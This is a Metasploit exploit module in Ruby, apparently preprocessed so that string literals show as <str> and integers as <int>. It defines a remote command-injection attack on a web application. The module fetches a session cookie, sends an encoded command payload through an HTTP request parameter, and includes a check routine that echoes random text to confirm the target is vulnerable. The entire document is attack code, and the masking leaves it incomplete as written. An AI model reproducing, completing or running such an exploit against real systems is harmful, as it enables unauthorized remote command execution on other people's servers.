require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > false , <str> = > { <str> = > <int> , <str> = > true , <str> = > { <str> = > <str> } } , <str> = > <str> , <str> = > ARCH_CMD , <str> = > [ [ <str> , { <str> = > <str> } ] , [ <str> , { <str> = > <str> } ] ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def check txt = Rex :: Text . rand_text_alpha ( <int> ) res = http_send_command ( <str> txt <str> ) if res && res . body =~ <str> txt <str> return Exploit :: CheckCode :: Vulnerable else return Exploit :: CheckCode :: Safe end end def push uri = normalize_uri ( target_uri . path ) res = send_request_cgi ( { <str> = > <str> , <str> = > uri , <str> = > { <str> = > <str> , <str> = > <str> } } ) if res . nil? vprint_error ( <str> ) fail_with ( Failure :: Unknown , <str> ) end if res && res . headers && res . code == <int> print_good ( <str> ) cookie = res . get_cookies cookie else fail_with ( Failure :: Unknown , <str> peer <str> ) end end def http_send_command ( cmd ) cookie = push res = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( target_uri . path ) , <str> = > cookie , <str> = > { <str> = > <str> , <str> = > cmd } } ) unless res && res . code == <int> fail_with ( Failure :: Unknown , <str> ) end res end def exploit http_send_command ( payload . encoded ) end end 
